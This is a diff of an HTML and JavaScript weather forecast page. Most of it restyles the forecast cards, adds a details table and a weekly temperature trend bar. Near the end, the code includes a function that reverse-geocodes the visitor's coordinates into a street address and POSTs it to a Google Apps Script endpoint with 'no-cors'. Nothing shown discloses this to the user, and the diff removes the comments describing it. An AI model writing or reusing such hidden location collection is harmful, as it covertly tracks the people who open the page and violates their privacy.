@@ -2,161 +2,132 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>7-Day Weather Forecast (Animated, Live Data)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<title>Weather Forecast</title>
 <style>
-  /* === BODY & THEME === */
   body {
     margin: 0;
     font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: linear-gradient(to top, #74ebd5, #ACB6E5);
+    background: linear-gradient(135deg, #89f7fe 0%, #66a6ff 100%), url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1400&q=80') center/cover no-repeat fixed;
     color: #333;
     display: flex;
     flex-direction: column;
     align-items: center;
     min-height: 100vh;
-    padding: 2rem;
+    padding: 1.2rem 0.5rem 2rem 0.5rem;
     transition: background 1s ease;
     overflow-x: hidden;
   }
   body.night {
-    background: linear-gradient(to top, #2c3e50, #4ca1af);
+    background: linear-gradient(135deg, #232526 0%, #414345 100%), url('https://images.unsplash.com/photo-1465101046530-73398c7f28ca?auto=format&fit=crop&w=1400&q=80') center/cover no-repeat fixed;
     color: #ddd;
   }
 
   h1 {
     text-align: center;
-    margin-bottom: 1rem;
+    margin-bottom: 0.7rem;
     user-select: none;
+    font-size: 2.2rem;
+    letter-spacing: 0.02em;
+    text-shadow: 0 4px 16px rgba(96,168,255,0.12);
   }
 
   #location-msg {
-    font-size: 1.1em;
-    margin-bottom: 2rem;
+    font-size: 1.09em;
+    margin-bottom: 1.2rem;
     user-select: none;
+    text-align: center;
+    text-shadow: 0 2px 8px rgba(255,255,255,0.09);
   }
 
   #error-msg {
     color: #b00;
     margin-top: 1rem;
     user-select: none;
-  }
-
-  /* === FORECAST GRID === */
-  .forecast-container {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-    gap: 1rem;
-    width: 100%;
-    max-width: 1100px;
-  }
-
-  /* === CARD BASE === */
-  .day-card {
-    perspective: 1000px;
-    position: relative;       /* Fix overlapping */
-    height: 320px;            /* Fixed height */
-  }
-
-  .card-inner {
-    position: relative;       /* Changed from absolute */
-    width: 100%;
-    height: 100%;
-    background: #fff;
-    border-radius: 16px;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-    padding: 1rem;
     text-align: center;
-    cursor: pointer;
-    transition: transform 0.6s;
-    transform-style: preserve-3d;
-  }
-  body.night .card-inner {
-    background: #2c3e50;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.6);
   }
 
-  .day-card:hover .card-inner,
-  .day-card:focus-within .card-inner {
-    transform: rotateY(180deg);
-  }
-
-  /* === CARD FRONT & BACK === */
-  .card-front, .card-back {
-    position: absolute;
+  .forecast-container {
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    overflow-x: auto;
+    gap: 0.7rem;
     width: 100%;
-    height: 100%;             /* Fill parent height */
-    backface-visibility: hidden;
-    border-radius: 16px;
-    left: 0; top: 0;
-    box-sizing: border-box;
-    padding: 1rem;
+    max-width: 100vw;
+    padding-bottom: 0.6rem;
+    scrollbar-width: thin;
+    scrollbar-color: #b7dbe6 #eee;
   }
-  .card-front {
-    /* front side styles */
+  .forecast-container::-webkit-scrollbar {
+    height: 7px;
   }
-  .card-back {
-    background: #f4f4f4;
-    transform: rotateY(180deg);
-    color: #333;
+  .forecast-container::-webkit-scrollbar-thumb {
+    background: #b7dbe6;
+    border-radius: 6px;
+  }
+  .forecast-container::-webkit-scrollbar-track {
+    background: #eee;
+  }
+
+  .day-card {
+    position: relative;
+    width: 82vw;
+    max-width: 340px;
+    min-width: 260px;
+    height: 320px;
+    flex: 0 0 auto;
+    border-radius: 22px;
+    outline: none;
+    box-shadow: 0 6px 32px 0 rgba(60,80,140,0.13), 0 2px 28px 0 rgba(106,196,255,0.09);
+    transition: box-shadow 0.2s, transform 0.2s, height 0.45s cubic-bezier(.4,2,.3,1);
+    background: rgba(255,255,255,0.90);
+    margin-bottom: 1.2rem;
+    cursor: pointer;
+    overflow: visible;
     display: flex;
     flex-direction: column;
-    justify-content: center;
-    align-items: flex-start;
-    font-size: 1em;
-    line-height: 1.5;
-    gap: 12px;
+    backdrop-filter: blur(3px) saturate(120%);
+    border: 2px solid rgba(80,170,255,0.07);
   }
-  body.night .card-back {
-    background: #3a4a5a;
-    color: #ddd;
+  .day-card.selected {
+    box-shadow: 0 12px 40px 0 #4ca1af77, 0 2px 32px 0 #66a6ff44;
+    transform: scale(1.025);
+    z-index: 5;
+    height: 540px;
+    background: rgba(255,255,255,0.97);
+    border: 2.5px solid #66a6ff44;
+  }
+  body.night .day-card {
+    background: rgba(44,62,80,0.92);
+    color: #eee;
+    border: 2px solid rgba(100,150,190,0.13);
+  }
+  body.night .day-card.selected {
+    background: rgba(40,60,80,0.98);
+    border: 2.5px solid #4ca1af77;
   }
 
-  /* Label styling on back */
-  .card-back .info-label {
-    font-weight: 600;
-    color: #555;
-    min-width: 90px;
-    display: inline-block;
-  }
-  body.night .card-back .info-label {
-    color: #aaa;
-  }
-
-  .card-back .info-row {
-    width: 100%;
+  .card-summary {
+    padding: 1rem 0.7rem 0.9rem 0.7rem;
+    text-align: center;
+    min-height: 210px;
     display: flex;
+    flex-direction: column;
     align-items: center;
     justify-content: flex-start;
-    gap: 8px;
-    border-bottom: 1px solid #ddd;
-    padding-bottom: 6px;
-  }
-  body.night .card-back .info-row {
-    border-color: #555;
-  }
-  .card-back .info-row:last-child {
-    border-bottom: none;
-    padding-bottom: 0;
+    flex: 1 0 auto;
   }
 
-  .card-back .info-value {
-    font-weight: 500;
-    color: #222;
-  }
-  body.night .card-back .info-value {
-    color: #eee;
-  }
-
-  /* === DAY NAME === */
   .day-name {
     font-weight: 700;
-    font-size: 1.2em;
+    font-size: 1.18em;
+    letter-spacing: 0.01em;
+    margin-bottom: 0.3em;
+    user-select: none;
+    text-shadow: 0 2px 8px #66a6ff22;
   }
 
-  /* === WEATHER ICONS & Animations === */
-
-  /* Sun blinking */
   @keyframes sunBlink {
     0%,100% {opacity:1;}
     50% {opacity:0.5;}
@@ -164,8 +135,6 @@
   .icon-sunny {
     animation: sunBlink 2s infinite;
   }
-
-  /* Clouds drifting */
   @keyframes cloudDrift {
     0%, 100% { transform: translateX(0); }
     50% { transform: translateX(5px); }
@@ -173,79 +142,62 @@
   .icon-cloudy {
     animation: cloudDrift 4s ease-in-out infinite;
   }
-
-  /* Raindrops falling */
-  .rain-container {
+  .rain-container, .snow-container, .wind-container {
+    width: 48px;
+    height: 48px;
+    margin: 0 auto 8px;
     position: relative;
-    width: 60px;
-    height: 60px;
-    margin: 0 auto 10px;
   }
-  .icon-rainy {
-    width: 60px;
-    height: 60px;
+  .icon-rainy, .icon-snowy {
+    width: 48px;
+    height: 48px;
     display: block;
   }
   .raindrop {
     position: absolute;
-    bottom: 10px;
-    width: 4px;
-    height: 12px;
+    bottom: 8px;
+    width: 3px;
+    height: 10px;
     background: #00aaff;
     border-radius: 2px;
     animation: fall 1s linear infinite;
     opacity: 0.6;
   }
-  .raindrop:nth-child(1) { left: 15px; animation-delay: 0s; }
-  .raindrop:nth-child(2) { left: 30px; animation-delay: 0.3s; }
-  .raindrop:nth-child(3) { left: 45px; animation-delay: 0.6s; }
+  .raindrop:nth-child(2) { left: 12px; animation-delay: 0s;}
+  .raindrop:nth-child(3) { left: 24px; animation-delay: 0.3s;}
+  .raindrop:nth-child(4) { left: 36px; animation-delay: 0.55s;}
   @keyframes fall {
     0% { transform: translateY(0); opacity: 0.6; }
     80% { opacity: 1; }
-    100% { transform: translateY(20px); opacity: 0; }
-  }
-
-  /* Snowfall */
-  .snow-container {
-    position: relative;
-    width: 60px;
-    height: 60px;
-    margin: 0 auto 10px;
-  }
-  .icon-snowy {
-    width: 60px;
-    height: 60px;
-    display: block;
+    100% { transform: translateY(15px); opacity: 0; }
   }
   .snowflake {
     position: absolute;
     background: #fff;
     border-radius: 50%;
-    opacity: 0.8;
-    width: 6px;
-    height: 6px;
-    animation: snowFall 5s linear infinite;
+    opacity: 0.85;
+    width: 4px;
+    height: 4px;
+    animation: snowFall 4s linear infinite;
   }
-  .snowflake:nth-child(1) { left: 10px; animation-delay: 0s; animation-duration: 4s;}
-  .snowflake:nth-child(2) { left: 30px; animation-delay: 1.5s; animation-duration: 5s;}
-  .snowflake:nth-child(3) { left: 50px; animation-delay: 3s; animation-duration: 6s;}
+  .snowflake:nth-child(2) { left: 8px; animation-delay: 0s; animation-duration: 3.3s;}
+  .snowflake:nth-child(3) { left: 22px; animation-delay: 1.1s; animation-duration: 4s;}
+  .snowflake:nth-child(4) { left: 36px; animation-delay: 2.1s; animation-duration: 4.7s;}
   @keyframes snowFall {
     0% { transform: translateY(0); opacity: 0.8;}
-    100% { transform: translateY(40px); opacity: 0;}
+    100% { transform: translateY(21px); opacity: 0;}
   }
-
-  /* Lightning flash */
   .lightning-flash {
     position: absolute;
-    top: 5px; left: 50%;
-    width: 80px;
-    height: 80px;
-    background: rgba(255, 255, 255, 0.7);
-    filter: drop-shadow(0 0 10px #fff);
+    top: 3px; left: 50%;
+    width: 48px;
+    height: 48px;
+    background: rgba(255, 255, 255, 0.6);
+    filter: drop-shadow(0 0 8px #fff);
     opacity: 0;
     transform: translateX(-50%);
     animation: flash 1.5s infinite;
-    border-radius: 12px;
+    border-radius: 10px;
     pointer-events: none;
     z-index: 1;
   }
@@ -253,31 +205,23 @@
     0%, 90%, 100% {opacity: 0;}
     92%, 95% {opacity: 0.8;}
   }
-
-  /* Wind swirl */
-  .wind-container {
-    position: relative;
-    width: 60px;
-    height: 60px;
-    margin: 0 auto 10px;
-  }
   .wind-line {
     position: absolute;
-    border: 3px solid #ccc;
+    border: 2px solid #ccc;
     border-radius: 50%;
     border-top-color: transparent;
     border-right-color: transparent;
-    width: 35px;
-    height: 35px;
-    top: 12px;
-    left: 12px;
+    width: 27px;
+    height: 27px;
+    top: 8px;
+    left: 8px;
     animation: spin 2s linear infinite;
   }
   .wind-line.small {
-    width: 20px;
-    height: 20px;
-    top: 22px;
-    left: 22px;
+    width: 14px;
+    height: 14px;
+    top: 18px;
+    left: 18px;
     animation-duration: 3s;
   }
   @keyframes spin {
@@ -285,44 +229,177 @@
     100% {transform: rotate(360deg);}
   }
 
-  /* Temperature bar */
   .temp-bar-container {
-    background: #eee;
-    border-radius: 10px;
-    height: 10px;
-    margin: 8px 0 12px 0;
+    background: #e0e0e0;
+    border-radius: 8px;
+    height: 8px;
+    margin: 7px 0 10px 0;
     overflow: hidden;
+    width: 96%;
+    max-width: 210px;
+    box-shadow: 0 2px 12px #7fd9f733;
   }
   body.night .temp-bar-container {
     background: #555;
   }
   .temp-bar {
-    height: 10px;
+    height: 8px;
     background: linear-gradient(90deg, #ff9800, #f44336);
-    border-radius: 10px;
+    border-radius: 8px;
     transition: width 0.5s ease;
+    box-shadow: 0 1px 6px #ffa72644;
   }
 
-  /* Humidity & wind info */
   .info-row-front {
     display: flex;
-    justify-content: space-around;
-    font-size: 0.9em;
-    margin-top: 6px;
+    justify-content: center;
+    font-size: 0.97em;
+    margin-top: 5px;
     user-select: none;
+    gap: 0.7em;
+    width: 100%;
+    flex-wrap: wrap;
   }
   .info-item {
     display: flex;
     align-items: center;
-    gap: 4px;
+    gap: 3px;
+    min-width: 46px;
   }
   .info-item svg {
-    width: 16px;
-    height: 16px;
+    width: 15px;
+    height: 15px;
     fill: #666;
   }
   body.night .info-item svg {
     fill: #bbb;
+  }
+
+  .card-details {
+    width: 100%;
+    background: rgba(236, 245, 252, 0.97);
+    border-radius: 0 0 22px 22px;
+    box-shadow: 0 8px 32px 0 #4ca1af11;
+    margin: 0 auto;
+    margin-top: 0;
+    padding: 1.2em 1em 1.4em 1em;
+    opacity: 1;
+    pointer-events: auto;
+    transform: scaleY(1);
+    transition: opacity 0.3s, transform 0.33s;
+    position: relative;
+    z-index: 6;
+    box-sizing: border-box;
+    display: none;
+    flex: 0 0 auto;
+    background-image: linear-gradient(120deg, #f6d365 0%, #fda085 100%);
+    background-blend-mode: lighten;
+  }
+  .day-card.selected .card-details {
+    display: block;
+    animation: detailsFadeIn 0.55s both;
+  }
+  body.night .card-details {
+    background: rgba(44, 62, 80, 0.97);
+    background-image: linear-gradient(120deg, #434343 0%, #262626 100%);
+    color: #ccd;
+  }
+  @keyframes detailsFadeIn {
+    0% { opacity: 0; transform: translateY(-20px) scaleY(0.98);}
+    100% { opacity: 1; transform: translateY(0) scaleY(1);}
+  }
+  .card-details table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-bottom: 1em;
+    font-size: 1.09em;
+    background: rgba(255,255,255,0.15);
+    border-radius: 7px;
+    overflow: hidden;
+    box-shadow: 0 1px 6px #ffa72633;
+  }
+  .card-details th, .card-details td {
+    text-align: left;
+    padding: 0.35em 0.3em;
+    border-bottom: 1px solid #e0e6ef;
+  }
+  .card-details th {
+    color: #4ca1af;
+    font-weight: 700;
+    background: none;
+    border-bottom: 2px solid #b7dbe6;
+    font-size: 1em;
+  }
+  .card-details tr:last-child td {
+    border-bottom: none;
+  }
+  .card-details .trend-bar-container {
+    margin: 1.3em 0 0.4em 0;
+    width: 100%;
+  }
+  .trend-bar {
+    width: 100%;
+    height: 30px;
+    display: flex;
+    align-items: flex-end;
+    gap: 2px;
+  }
+  .trend-bar .trend-segment {
+    flex: 1;
+    border-radius: 2px 2px 0 0;
+    background: linear-gradient(180deg, #ff9800 0%, #f44336 100%);
+    min-width: 4px;
+    opacity: 0.8;
+    transition: height 0.3s;
+    box-shadow: 0 1px 6px #ffa72622;
+  }
+  body.night .trend-bar .trend-segment {
+    background: linear-gradient(180deg, #4ca1af 0%, #2c3e50 100%);
+  }
+  .trend-bar .trend-segment.selected {
+    box-shadow:0 0 0 2px #4ca1af, 0 2px 6px #4ca1af33;
+    opacity: 1;
+  }
+  .card-details .card-tip {
+    font-style: italic;
+    color: #4ca1af;
+    width: 100%;
+    text-align: center;
+    font-size: 0.97em;
+    letter-spacing: 0.01em;
+    opacity: 0.8;
+    margin-top: 1.1em;
+    text-shadow: 0 2px 10px #fff7;
+  }
+  body.night .card-details .card-tip {
+    color: #b8d6e5;
+  }
+
+  /* Animated floating circles for extra background beauty */
+  .floating-circles {
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    pointer-events: none;
+    overflow: hidden;
+    z-index: 0;
+    mix-blend-mode: lighten;
+  }
+  .circle {
+    position: absolute;
+    border-radius: 50%;
+    opacity: 0.16;
+    filter: blur(8px);
+    animation: floatCircle 30s linear infinite;
+    background: radial-gradient(circle at 30% 70%, #66a6ff 0%, #89f7fe 100%);
+  }
+  .circle.c1 { width: 160px; height: 160px; left: 6vw;  top: 8vh;   animation-delay: 0s; }
+  .circle.c2 { width: 90px;  height: 90px;  left: 60vw; top: 23vh;  animation-delay: 12s; }
+  .circle.c3 { width: 210px; height: 210px; left: 48vw; top: 67vh;  animation-delay: 17s; }
+  .circle.c4 { width: 110px; height: 110px; left: 82vw; top: 38vh;  animation-delay: 7s; }
+  @keyframes floatCircle {
+    0%   { transform: translateY(0) scale(1);}
+    50%  { transform: translateY(-10vh) scale(1.08);}
+    100% { transform: translateY(0) scale(1);}
   }
 
   /* Background clouds */
@@ -338,110 +415,89 @@
     background: #fff;
     background: radial-gradient(ellipse at center, #fff 0%, #cce7ff 80%);
     border-radius: 50%;
-    opacity: 0.3;
+    opacity: 0.17;
     filter: blur(8px);
     animation: cloudDriftBG linear infinite;
   }
   .cloud1 {
-    width: 150px; height: 90px;
+    width: 85px; height: 45px;
     top: 10%;
-    left: -200px;
-    animation-duration: 90s;
+    left: -120px;
+    animation-duration: 40s;
   }
   .cloud2 {
-    width: 220px; height: 130px;
-    top: 30%;
-    left: -300px;
-    animation-duration: 70s;
+    width: 110px; height: 69px;
+    top: 34%;
+    left: -180px;
+    animation-duration: 30s;
   }
   .cloud3 {
-    width: 120px; height: 80px;
-    top: 50%;
-    left: -180px;
-    animation-duration: 80s;
+    width: 70px; height: 38px;
+    top: 58%;
+    left: -90px;
+    animation-duration: 38s;
   }
   @keyframes cloudDriftBG {
     0% {transform: translateX(0);}
     100% {transform: translateX(130vw);}
   }
-  /* Responsive grid for different screen sizes */
-.forecast-container {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-  gap: 1rem;
-  width: 100%;
-  max-width: 1100px;
-  margin: 0 auto;
-}
 
-/* Mobile first adjustments */
-@media (max-width: 480px) {
-  .forecast-container {
-    grid-template-columns: 1fr;  /* one column on small phones */
+  @media (max-width: 600px) {
+    .day-card {
+      width: 93vw;
+      min-width: 220px;
+      max-width: 99vw;
+      height: 270px;
+      margin: 0 0.1rem 1.2rem 0.1rem;
+      border-radius: 16px;
+    }
+    .day-card.selected {
+      height: 540px;
+    }
+    .card-summary {
+      padding: 0.7rem 0.3rem 0.7rem 0.3rem;
+      min-height: 170px;
+      font-size: 15px;
+    }
+    .day-name {
+      font-size: 1.07em;
+    }
+    .temp-bar-container {
+      max-width: 160px;
+      height: 6px;
+    }
+    .temp-bar {
+      height: 6px;
+    }
+    .icon, .icon-rainy, .icon-snowy, .rain-container, .snow-container, .wind-container {
+      width: 39px !important;
+      height: 39px !important;
+      margin-bottom: 5px;
+    }
   }
-  .day-card {
-    height: 280px; /* fixed height for flip cards */
-    max-width: 320px;
-    margin: 0 auto;
+  @media (max-width: 400px) {
+    .day-card {
+      width: 98vw;
+      min-width: 170px;
+      max-width: 99vw;
+      height: 210px;
+    }
+    .day-card.selected {
+      height: 440px;
+    }
+    .card-summary {
+      min-height: 80px;
+      padding: 0.3rem 0.1rem 0.4rem 0.1rem;
+      font-size: 13px;
+    }
+    .temp-bar-container {
+      max-width: 90px;
+      height: 5px;
+    }
+    .temp-bar {
+      height: 5px;
+    }
   }
-  .card-inner {
-    padding: 0.8rem;
-  }
-  .day-name {
-    font-size: 1.1em;
-  }
-  .card-back .info-label {
-    min-width: 80px;
-    font-size: 0.9em;
-  }
-  .card-back .info-value {
-    font-size: 0.9em;
-  }
-  .icon,
-  .icon-rainy,
-  .icon-snowy,
-  .rain-container,
-  .snow-container,
-  .wind-container {
-    width: 50px !important;
-    height: 50px !important;
-    margin-bottom: 8px;
-  }
-}
-
-/* Tablets and larger phones */
-@media (min-width: 481px) and (max-width: 800px) {
-  .forecast-container {
-    grid-template-columns: repeat(2, 1fr); /* two columns */
-  }
-  .day-card {
-    height: 300px;
-    max-width: none;
-  }
-  .card-inner {
-    padding: 1rem;
-  }
-  .day-name {
-    font-size: 1.2em;
-  }
-  .card-back .info-label {
-    min-width: 90px;
-    font-size: 1em;
-  }
-  .card-back .info-value {
-    font-size: 1em;
-  }
-  .icon,
-  .icon-rainy,
-  .icon-snowy,
-  .rain-container,
-  .snow-container,
-  .wind-container {
-    width: 60px !important;
-    height: 60px !important;
-    margin-bottom: 10px;
-  }
-}
 </style>
 </head>
 <body>
@@ -451,6 +507,12 @@
 <div id="error-msg" role="alert" aria-live="assertive"></div>
 <div class="forecast-container" id="forecast"></div>
 
+<div class="floating-circles" aria-hidden="true">
+  <div class="circle c1"></div>
+  <div class="circle c2"></div>
+  <div class="circle c3"></div>
+  <div class="circle c4"></div>
+</div>
 <div class="background-clouds" aria-hidden="true">
   <div class="cloud cloud1"></div>
   <div class="cloud cloud2"></div>
@@ -510,6 +572,18 @@ function getTempBarWidth(tempC) {
   return Math.min(Math.max(percent, 0), 100);
 }
 
+// Helper to build a simple temperature trend bar for the week
+function buildTrendBar(forecast, currentIdx) {
+  const allMaxTemps = forecast.map(day => day.day.maxtemp_c);
+  const min = Math.min(...allMaxTemps);
+  const max = Math.max(...allMaxTemps);
+  return `<div class="trend-bar">${allMaxTemps.map((temp, idx) => {
+    const percent = max === min ? 100 : ((temp - min) / (max - min)) * 100;
+    const highlight = idx === currentIdx ? ' selected' : '';
+    return `<div class="trend-segment${highlight}" style="height:${8 + (percent * 0.22)}px"></div>`;
+  }).join('')}</div>`;
+}
+
 function renderForecast(data) {
   const forecastDiv = document.getElementById("forecast");
   const locationMsg = document.getElementById("location-msg");
@@ -525,15 +599,12 @@ function renderForecast(data) {
 
   locationMsg.textContent = `Weather forecast for ${data.location.name}, ${data.location.region || data.location.country}`;
 
-  forecastDiv.innerHTML = dailyData.map(day => {
+  forecastDiv.innerHTML = dailyData.map((day, idx) => {
     const main = day.day.condition.text.toLowerCase();
-    // Fix icon URL: prepend domain only if needed
     const iconPath = day.day.condition.icon;
     const iconUrl = iconPath.startsWith('http') ? iconPath : "https://cdn.weatherapi.com" + iconPath;
-
     let weatherHTML = "";
     let sunnyText = day.day.condition.text;
-
     if (main.includes("clear") || main.includes("sunny")) {
       weatherHTML = `<img class="icon icon-sunny" src="https://cdn.weatherapi.com/weather/64x64/day/113.png" alt="sunny" />`;
       sunnyText = "☀️ Sunny";
@@ -560,35 +631,91 @@ function renderForecast(data) {
     }
 
     const tempBarWidth = getTempBarWidth(day.day.maxtemp_c);
+    const chanceRain = day.day.daily_chance_of_rain !== undefined ? day.day.daily_chance_of_rain : (day.day.daily_will_it_rain ? 60 : 0);
 
     return `
-      <div class="day-card" tabindex="0" aria-label="Weather forecast for ${getDayName(day.date)}">
-        <div class="card-inner">
-          <div class="card-front">
-            <div class="day-name">${getDayName(day.date)}</div>
-            ${weatherHTML}
-            <div>${Math.round(day.day.maxtemp_c)}°C / ${Math.round(day.day.mintemp_c)}°C</div>
-            <div class="temp-bar-container" aria-hidden="true">
-              <div class="temp-bar" style="width: ${tempBarWidth}%;"></div>
-            </div>
-            <div class="condition">${day.day.condition.text}</div>
-            <div>${sunnyText}</div>
-            <div class="info-row-front" aria-hidden="true">
-              <div class="info-item" title="Humidity">${humiditySVG} ${day.day.avghumidity}%</div>
-              <div class="info-item" title="Wind speed">${windSVG} ${Math.round(day.day.maxwind_kph / 3.6)} m/s</div>
-            </div>
+      <div class="day-card" tabindex="0" data-idx="${idx}" aria-label="Weather forecast for ${getDayName(day.date)}">
+        <div class="card-summary">
+          <div class="day-name">${getDayName(day.date)}</div>
+          ${weatherHTML}
+          <div style="margin-bottom:0.1em;"><span style="font-weight:600;font-size:1.13em">${Math.round(day.day.maxtemp_c)}°C</span> / <span style="color:#888">${Math.round(day.day.mintemp_c)}°C</span></div>
+          <div class="temp-bar-container" aria-hidden="true">
+            <div class="temp-bar" style="width: ${tempBarWidth}%;"></div>
           </div>
-          <div class="card-back">
-            <div class="info-row"><span class="info-label">Sunrise:</span><span class="info-value">${day.astro.sunrise}</span></div>
-            <div class="info-row"><span class="info-label">Sunset:</span><span class="info-value">${day.astro.sunset}</span></div>
-            <div class="info-row"><span class="info-label">Humidity:</span><span class="info-value">${day.day.avghumidity}%</span></div>
-            <div class="info-row"><span class="info-label">Wind Speed:</span><span class="info-value">${Math.round(day.day.maxwind_kph / 3.6)} m/s</span></div>
-            <div class="info-row"><span class="info-label">Condition:</span><span class="info-value">${day.day.condition.text}</span></div>
+          <div class="condition" style="font-size:0.97em;margin-bottom:0.06em;">${day.day.condition.text}</div>
+          <div style="font-size:1.1em;margin-bottom:0.05em;">${sunnyText}</div>
+          <div class="info-row-front" aria-hidden="true">
+            <div class="info-item" title="Humidity">${humiditySVG} ${day.day.avghumidity}%</div>
+            <div class="info-item" title="Wind speed">${windSVG} ${Math.round(day.day.maxwind_kph / 3.6)} m/s</div>
           </div>
+        </div>
+        <div class="card-details">
+          <table>
+            <tr>
+              <th>Sunrise</th>
+              <td>${day.astro.sunrise}</td>
+            </tr>
+            <tr>
+              <th>Sunset</th>
+              <td>${day.astro.sunset}</td>
+            </tr>
+            <tr>
+              <th>Humidity</th>
+              <td>${day.day.avghumidity}%</td>
+            </tr>
+            <tr>
+              <th>Wind Speed</th>
+              <td>${Math.round(day.day.maxwind_kph / 3.6)} m/s</td>
+            </tr>
+            <tr>
+              <th>Condition</th>
+              <td>${day.day.condition.text}</td>
+            </tr>
+            <tr>
+              <th>Chance of Rain</th>
+              <td>${chanceRain}%</td>
+            </tr>
+            <tr>
+              <th>UV Index</th>
+              <td>${day.day.uv}</td>
+            </tr>
+          </table>
+          <div class="trend-bar-container">
+            <div style="font-size:0.95em;margin-bottom:2px;color:#4ca1af;opacity:0.8;">Weekly Max Temp Trend</div>
+            ${buildTrendBar(dailyData, idx)}
+          </div>
+          <div class="card-tip">Tip: Tap/click another day to compare. Tap again to collapse. Stay hydrated and safe! 🌦️</div>
         </div>
       </div>
     `;
   }).join('');
+
+  // Show/collapse details when a card is clicked (toggle)
+  document.querySelectorAll('.day-card').forEach(card => {
+    card.addEventListener('click', function(e) {
+      const isSelected = card.classList.contains('selected');
+      // Hide all
+      document.querySelectorAll('.day-card').forEach(c => c.classList.remove('selected'));
+      // Toggle current card
+      if (!isSelected) {
+        card.classList.add('selected');
+        // Scroll into view on small screens if needed
+        if (window.innerWidth < 700) {
+          setTimeout(() => {
+            card.scrollIntoView({behavior: 'smooth', block: 'nearest', inline: 'center'});
+          }, 120);
+        }
+      }
+      e.stopPropagation();
+    });
+  });
+
+  // Clicking outside cards collapses all
+  document.body.addEventListener('click', function(e) {
+    if (!e.target.closest('.day-card')) {
+      document.querySelectorAll('.day-card').forEach(c => c.classList.remove('selected'));
+    }
+  });
 }
 
 function showError(message) {
@@ -597,16 +724,13 @@ function showError(message) {
 }
 
 function sendLocationToGoogleApps(lat, lon) {
-  // Reverse geocode with OpenStreetMap to get address
   fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
     .then(res => res.json())
     .then(data => {
       const address = data.display_name || "Address not found";
-
-      // Send location + address to Google Apps Script
       fetch('https://script.google.com/macros/s/AKfycbxxNyGyhooeofr9ZlRQEu90bolM3UfzfkxKENBzyXvHALV3d0lTA_HP0MIJMZO2F5QvPw/exec', {
         method: 'POST',
-        mode: 'no-cors',  // avoid CORS issues
+        mode: 'no-cors',
         headers: {
           'Content-Type': 'application/json'
         },
@@ -663,8 +787,6 @@ function requestLocationAndFetch() {
 window.onload = () => {
   requestLocationAndFetch();
 };
-
 </script>
-
 </body>
 </html>
